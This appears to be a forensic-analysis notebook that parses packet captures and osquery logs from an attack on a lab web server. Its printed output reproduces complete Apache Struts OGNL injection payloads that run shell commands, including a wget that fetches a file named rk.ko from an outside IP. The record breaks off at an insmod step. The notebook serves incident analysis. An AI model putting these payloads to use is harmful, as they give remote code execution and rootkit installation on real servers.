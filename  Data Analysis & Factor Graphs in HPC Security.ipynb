{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "VTggTLA1Q9zr"
   },
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "import pyshark\n",
    "from matplotlib import pyplot as plt\n",
    "from datetime import date\n",
    "import seaborn as sns\n",
    "from IPython.display import Image\n",
    "from pandas.io.json import json_normalize as jn\n",
    "\n",
    "import warnings\n",
    "warnings.filterwarnings('ignore')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "vJMM92oxQ9zw"
   },
   "source": [
    "## Introduction & Data Preprocessing"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "X4yrMVsPQ9zw"
   },
   "source": [
    "### Reading *.pcap and *.log files using PyShark"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "WaZKKceSQ9zx"
   },
   "outputs": [],
   "source": [
    "http = pyshark.FileCapture('http.pcap',keep_packets=True)\n",
    "http2 = pyshark.FileCapture('http2.pcap',keep_packets=True)\n",
    "dns = pyshark.FileCapture('dns.pcap',keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "FK5RgvBBQ9z0"
   },
   "outputs": [],
   "source": [
    "# pyshark reads packets on demand\n",
    "try:\n",
    "    i=0\n",
    "    while True:\n",
    "        http[i]\n",
    "        i += 1\n",
    "except KeyError:\n",
    "    pass\n",
    "try:\n",
    "    i=0\n",
    "    while True:\n",
    "        http2[i]\n",
    "        i += 1\n",
    "except KeyError:\n",
    "    pass\n",
    "try:\n",
    "    i=0\n",
    "    while True:\n",
    "        dns[i]\n",
    "        i += 1\n",
    "except KeyError:\n",
    "    pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "w7Xs3VB9Q9z4"
   },
   "outputs": [],
   "source": [
    "# http[529].http.Content_type.find('#cmd')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "bvxxwmoOQ9z7"
   },
   "source": [
    "### Creating DataFrame from *.pcap and *.log files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "_EbQoUFQQ9z8"
   },
   "outputs": [],
   "source": [
    "# http.pcap Dictionary\n",
    "http_df_data = []\n",
    "for pkt in http:\n",
    "    try:\n",
    "        if pkt.ip.layer_name == 'ip' and pkt.tcp.layer_name == 'tcp':\n",
    "            d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'dest_ip': pkt.ip.dst,\n",
    "                'dest_port': pkt.tcp.dstport,\n",
    "                'length':len(pkt),\n",
    "                'highest layer':pkt.highest_layer\n",
    "            }\n",
    "            http_df_data.append(d)\n",
    "    except:\n",
    "        pass;\n",
    "        \n",
    "# http2.pcap Dictionary\n",
    "http2_df_data = []\n",
    "for pkt in http2:\n",
    "    d = {\n",
    "        'timestamp': pkt.sniff_time.timestamp(),\n",
    "        'length':len(pkt),\n",
    "        'highest layer':pkt.highest_layer\n",
    "    }\n",
    "    http2_df_data.append(d)\n",
    "\n",
    "# dns.pcap Dictionary\n",
    "dns_df_data = []\n",
    "for pkt in dns:\n",
    "    try:\n",
    "        if pkt.dns.layer_name == 'dns':\n",
    "            d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'dest_ip': pkt.ip.dst,\n",
    "                'dest_port': pkt.udp.dstport,\n",
    "                'length':len(pkt),\n",
    "                'highest layer':pkt.highest_layer\n",
    "            }\n",
    "            dns_df_data.append(d)\n",
    "    except:\n",
    "        pass;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "W086jwIcQ9z_"
   },
   "outputs": [],
   "source": [
    "# Generating DataFrame from Dictionaries\n",
    "http_df=pd.DataFrame(http_df_data)\n",
    "http2_df=pd.DataFrame(http2_df_data)\n",
    "dns_df=pd.DataFrame(dns_df_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "Ad0swVgiQ90C",
    "outputId": "bd351d5c-8b66-49fa-a7cf-8e04f865a1b1"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>length</th>\n",
       "      <th>highest layer</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "      <td>58</td>\n",
       "      <td>TCP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>55952</td>\n",
       "      <td>58</td>\n",
       "      <td>TCP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "      <td>54</td>\n",
       "      <td>TCP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>8080</td>\n",
       "      <td>766</td>\n",
       "      <td>HTTP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>55952</td>\n",
       "      <td>54</td>\n",
       "      <td>TCP</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp     dest_ip dest_port  length highest layer\n",
       "0  1.521395e+09  172.17.0.2      8080      58           TCP\n",
       "1  1.521395e+09    10.0.2.2     55952      58           TCP\n",
       "2  1.521395e+09  172.17.0.2      8080      54           TCP\n",
       "3  1.521395e+09  172.17.0.2      8080     766          HTTP\n",
       "4  1.521395e+09    10.0.2.2     55952      54           TCP"
      ]
     },
     "execution_count": 11,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "vSQJcRI3Q90G",
    "outputId": "a857f2f5-a3c5-4e04-db39-00ba0c2b7066"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>length</th>\n",
       "      <th>highest layer</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>55</td>\n",
       "      <td>TLS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>66</td>\n",
       "      <td>TCP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>55</td>\n",
       "      <td>TLS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>66</td>\n",
       "      <td>TCP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>55</td>\n",
       "      <td>TCP</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp  length highest layer\n",
       "0  1.553740e+09      55           TLS\n",
       "1  1.553740e+09      66           TCP\n",
       "2  1.553740e+09      55           TLS\n",
       "3  1.553740e+09      66           TCP\n",
       "4  1.553740e+09      55           TCP"
      ]
     },
     "execution_count": 12,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http2_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "u8eRmzB7Q90J",
    "outputId": "6a4ced0a-94d7-4c1f-93fb-0e4ce1b531ae"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>length</th>\n",
       "      <th>highest layer</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>53</td>\n",
       "      <td>88</td>\n",
       "      <td>DNS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>43204</td>\n",
       "      <td>93</td>\n",
       "      <td>DNS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>53</td>\n",
       "      <td>88</td>\n",
       "      <td>DNS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>43204</td>\n",
       "      <td>93</td>\n",
       "      <td>DNS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>53</td>\n",
       "      <td>88</td>\n",
       "      <td>DNS</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp          dest_ip dest_port  length highest layer\n",
       "0  1.521397e+09  162.212.156.148        53      88           DNS\n",
       "1  1.521397e+09        10.0.2.15     43204      93           DNS\n",
       "2  1.521397e+09  162.212.156.148        53      88           DNS\n",
       "3  1.521397e+09        10.0.2.15     43204      93           DNS\n",
       "4  1.521397e+09  162.212.156.148        53      88           DNS"
      ]
     },
     "execution_count": 13,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "QJEpuFinQ90M"
   },
   "source": [
    "### Process OS Query Logs into pd.DataFrame"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "VWFaxBDAQ90N",
    "outputId": "e7136fb8-43e3-4dc4-8a92-c0e90100ab09"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>0644</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swp</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "3  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "4  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime epoch counter action                 decorations.host_uuid  \\\n",
       "0  1517877185     0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                               NaN   \n",
       "3                 root          NaN  ...                               NaN   \n",
       "4                 root          NaN  ...                               NaN   \n",
       "\n",
       "  columns.mode columns.mtime                              columns.sha1  \\\n",
       "0          NaN           NaN                                       NaN   \n",
       "1         0644    1517877228  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2          NaN           NaN                                       NaN   \n",
       "3          NaN           NaN                                       NaN   \n",
       "4          NaN           NaN                                       NaN   \n",
       "\n",
       "                                      columns.sha256 columns.size  \\\n",
       "0                                                NaN          NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...         4096   \n",
       "2                                                NaN          NaN   \n",
       "3                                                NaN          NaN   \n",
       "4                                                NaN          NaN   \n",
       "\n",
       "                 columns.target_path columns.time columns.transaction_id  \\\n",
       "0                                NaN          NaN                    NaN   \n",
       "1  \\/etc\\/osquery\\/.osquery.conf.swp   1517877228                      0   \n",
       "2  \\/etc\\/osquery\\/.osquery.conf.swx   1517877228                      0   \n",
       "3  \\/etc\\/osquery\\/.osquery.conf.swx   1517877228                      0   \n",
       "4  \\/etc\\/osquery\\/.osquery.conf.swx   1517877228                      0   \n",
       "\n",
       "  columns.uid  \n",
       "0         NaN  \n",
       "1           0  \n",
       "2         NaN  \n",
       "3         NaN  \n",
       "4         NaN  \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 15,
     "metadata": {
      "tags": []
     },
     "output_type": "execute_result"
    }
   ],
   "source": [
    "log_df=pd.DataFrame()\n",
    "with open('osqueryd.results.log') as f:\n",
    "    for line in f:\n",
    "        log_df=pd.concat([log_df,jn(eval(line))]) \n",
    "\n",
    "log_df = log_df.replace(r'^\\s*$', np.nan, regex=True)\n",
    "log_df.reset_index(inplace=True)\n",
    "log_df.drop(['index'], axis=1, inplace=True)\n",
    "\n",
    "log_df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "aetMlkO5Q90S"
   },
   "source": [
    "### Exporting to *.csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "1iBuNfcMQ90T"
   },
   "outputs": [],
   "source": [
    "http_df.to_csv('http.csv')\n",
    "http2_df.to_csv('http2.csv')\n",
    "dns_df.to_csv('dns.csv')\n",
    "log_df.to_csv('osqueryd.csv')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "Uu4f9FeeQ90W"
   },
   "source": [
    "### Which is attacker *.pcap? http or http2?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "XsapwFQ60pUo"
   },
   "source": [
    "If **#cmd** is in the content-type, then pcap file is attacker file. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "0lc5-yVhQ90W"
   },
   "outputs": [],
   "source": [
    "count_http2 = 0\n",
    "for pkt in http2:\n",
    "    try:\n",
    "        s = pkt.http.Content_type\n",
    "        if '#cmd'  in s:\n",
    "            count_http2+=1\n",
    "    except:\n",
    "        pass;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "YDTnXGofQ90Z",
    "outputId": "6a12cfdc-4938-4a0d-fa89-9a1cef3d24ff"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http.pcap is attacker file\n",
      "http2.pcap is not attacker file\n"
     ]
    }
   ],
   "source": [
    "count_http = 0\n",
    "for pkt in http:\n",
    "    try:\n",
    "        s = pkt.http.Content_type\n",
    "        if '#cmd'  in s:\n",
    "            count_http+=1\n",
    "    except:\n",
    "        pass;\n",
    "\n",
    "if count_http>0:\n",
    "    print('http.pcap is attacker file')\n",
    "else:\n",
    "    print('http.pcap is not attacker file')\n",
    "if count_http2>0:\n",
    "    print('http2.pcap is attacker file')\n",
    "else:\n",
    "    print('http2.pcap is not attacker file')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "63dl20jaQ90h"
   },
   "source": [
    "## Data Exploration/Forensics Prior To Building a Machine Learning Model"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "pXerRBMtQ90i"
   },
   "source": [
    "## HTTP Traffic Analysis (Attack Stages 1-2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "-Pr5yNo-Q90j"
   },
   "outputs": [],
   "source": [
    "# http[30].http.request_uri\n",
    "# http[551].http.Content_type"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "qzEPPjA4Q90m",
    "outputId": "7f53e4aa-0c94-4b29-956f-13e35b541c49"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "UNIX timestamp: 1521394903.610774 \n",
      "IP Address: 172.17.0.2 \n",
      "Port: 8080\n"
     ]
    }
   ],
   "source": [
    "# Subtast 1: UNIX timestamp, IP address, port of Vulnerable server\n",
    "timestamp, ip_address, port = [], [], []\n",
    "for i, pkt in enumerate(http):\n",
    "    if len(pkt.layers) < 3:\n",
    "        continue\n",
    "    if pkt[2].layer_name != 'tcp':\n",
    "        continue\n",
    "    try:\n",
    "        if pkt.http.request_uri == '/showcase.action':\n",
    "            print('UNIX timestamp:',pkt.sniff_time.timestamp(),\n",
    "                  '\\nIP Address:', pkt.ip.dst,\n",
    "                  '\\nPort:', pkt.tcp.dstport)\n",
    "            break\n",
    "    except:\n",
    "        pass;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 0,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "oO2SZ4i9Q90p",
    "outputId": "ef21b4ef-196d-4fa4-fa95-0c0aa8d2661e",
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "519 'ls' 172.17.0.2 172.17.0.1 \n",
      " %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \n",
      "\n",
      "529 whoami 172.17.0.2 172.17.0.1 \n",
      " %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \n",
      "\n",
      "539 wget 172.17.0.2 172.17.0.1 \n",
      " %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \n",
      "\n",
      "551 wget 172.17.0.2 172.17.0.1 \n",
      " %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \n",
      "\n",
      "577 insmod 172.17.0.2 172.17.0.1 \n",
